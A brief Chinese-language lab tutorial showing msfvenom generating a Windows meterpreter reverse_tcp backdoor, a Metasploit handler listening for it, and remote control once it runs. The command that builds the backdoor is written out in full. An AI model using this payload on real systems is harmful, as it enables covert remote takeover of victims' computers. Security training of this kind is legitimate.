--   
在kali中，使用sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.109.128 lport=9998 -f exe -o /var/payload.exe命令，生成在Windows上运行的后门。  
这个后门一旦运行，其将主动去连接192.168.109.128的9998端口。  
并将这个后门存放在/var目录下   
![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/msfvenom%20payload%20generate.png)  
<br>
<br>
<br>
<br>

--   
在Metesploit中，使用exploit/multi/handler模块  
设置lhost lport 和payload  
运行开始监听  
![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/reverse%20TCP%20handler.png)  
<br>
<br>
<br>
<br>

--  
将生成的payload复制到Windows上并运行  
在kali中便可以控制Windows
![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/msfvenom%20payload%20result.png)  

